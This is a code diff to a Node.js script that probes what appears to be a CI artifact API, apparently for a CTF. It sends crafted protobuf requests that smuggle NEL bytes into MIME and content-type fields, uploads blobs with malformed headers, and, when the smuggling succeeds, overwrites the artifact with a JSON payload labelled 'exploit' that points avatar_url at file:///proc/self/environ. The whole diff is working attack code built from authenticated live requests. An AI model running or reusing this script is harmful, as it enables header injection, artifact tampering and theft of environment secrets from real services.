@@ -35,9 +35,9 @@ module.exports = async function scan() {
     const bytes = Buffer.isBuffer(data) ? data : Buffer.from(data);
     return Buffer.concat([varint(number * 8 + 2), varint(bytes.length), bytes]);
   }
-  function proto(name, mimeBuffers) {
+  function proto(name, mimeBuffers, preWrapped = false) {
     const pieces = [field(1, runId), field(2, jobId), field(3, name), Buffer.from([0x28, 0x07])];
-    for (const mime of mimeBuffers) pieces.push(field(6, field(1, mime)));
+    for (const mime of mimeBuffers) pieces.push(field(6, preWrapped ? mime : field(1, mime)));
     return Buffer.concat(pieces);
   }
   const binary = [
@@ -47,12 +47,19 @@ module.exports = async function scan() {
     ['binary-overlong-nel', proto('vs-bin-overlong-nel', [Buffer.from([...Buffer.from(safe), 0xc0, 0x85])])],
     ['binary-safe-then-nel', proto('vs-bin-dupe-a', [Buffer.from(safe), Buffer.from(weird)])],
     ['binary-nel-then-safe', proto('vs-bin-dupe-b', [Buffer.from(weird), Buffer.from(safe)])],
+    ['binary-inner-safe-then-nel', proto('vs-inner-dupe-a', [Buffer.concat([field(1, safe), field(1, weird)])], true)],
+    ['binary-inner-nel-then-safe', proto('vs-inner-dupe-b', [Buffer.concat([field(1, weird), field(1, safe)])], true)],
   ];
   for (const [label, body] of binary) {
     const response = await fetch(url, {method: 'POST', headers: {'Authorization': `Bearer ${runtimeToken}`, 'Content-Type': 'application/protobuf'}, body});
     const result = Buffer.from(await response.arrayBuffer());
     console.log(`${label}: HTTP ${response.status}; type=${response.headers.get('content-type')}; bytes=${result.byteLength}`);
-    if (label === 'binary-nel-then-safe' && response.ok) {
+    const targetName = {
+      'binary-nel-then-safe': 'vs-bin-dupe-b',
+      'binary-inner-safe-then-nel': 'vs-inner-dupe-a',
+      'binary-inner-nel-then-safe': 'vs-inner-dupe-b',
+    }[label];
+    if (targetName && response.ok) {
       function readVarint(bytes, pos) {
         let value = 0, shift = 0, byte;
         do { byte = bytes[pos++]; value += (byte & 127) * 2 ** shift; shift += 7; } while (byte & 128);
@@ -73,7 +80,7 @@ module.exports = async function scan() {
       const put = await fetch(signedUploadUrl, {method: 'PUT', headers: {'Content-Type': 'application/octet-stream', 'x-ms-version': '2025-01-05', 'x-ms-blob-type': 'BlockBlob', 'x-ms-blob-content-type': weird}, body: blob});
       console.log(`binary-dupe finalize PUT: HTTP ${put.status}`);
       if (!put.ok) continue;
-      const finalized = await fetch(url.replace('/CreateArtifact', '/FinalizeArtifact'), {method: 'POST', headers: {'Authorization': `Bearer ${runtimeToken}`, 'Content-Type': 'application/json'}, body: JSON.stringify({...ids, name: 'vs-bin-dupe-b', size: String(blob.length)})});
+      const finalized = await fetch(url.replace('/CreateArtifact', '/FinalizeArtifact'), {method: 'POST', headers: {'Authorization': `Bearer ${runtimeToken}`, 'Content-Type': 'application/json'}, body: JSON.stringify({...ids, name: targetName, size: String(blob.length)})});
       const finalResult = await finalized.json();
       console.log(`binary-dupe Finalize: HTTP ${finalized.status}; ok=${Boolean(finalResult.ok)}`);
       if (!finalized.ok || !finalResult.ok) continue;
@@ -84,6 +91,15 @@ module.exports = async function scan() {
       let rawType = null;
       if (location) rawType = (await fetch(location)).headers.get('content-type');
       console.log(`binary-dupe download: HTTP ${download.status}; rsct=${JSON.stringify(rsct)}; Content-Type=${JSON.stringify(rawType)}`);
+      if (rawType?.includes('\u0085')) {
+        const exploit = Buffer.from(JSON.stringify({
+          full_name: `ijuns/repo-cassette-ctf-probe/actions/artifacts/${id}/zip`,
+          owner: {login: 'cassette', avatar_url: 'file:///proc/self/environ'},
+          description: 'Repo Cassette nested protobuf candidate', stargazers_count: 0,
+        }));
+        const rewritten = await fetch(signedUploadUrl, {method: 'PUT', headers: {'Content-Type': 'application/octet-stream', 'x-ms-version': '2025-01-05', 'x-ms-blob-type': 'BlockBlob', 'x-ms-blob-content-type': weird}, body: exploit});
+        console.log(`MIXED ${JSON.stringify({artifactId: id, uploadStatus: rewritten.status, repository: `ijuns/repo-cassette-ctf-probe/actions/artifacts/${id}/zip`})}`);
+      }
     }
   }
 };
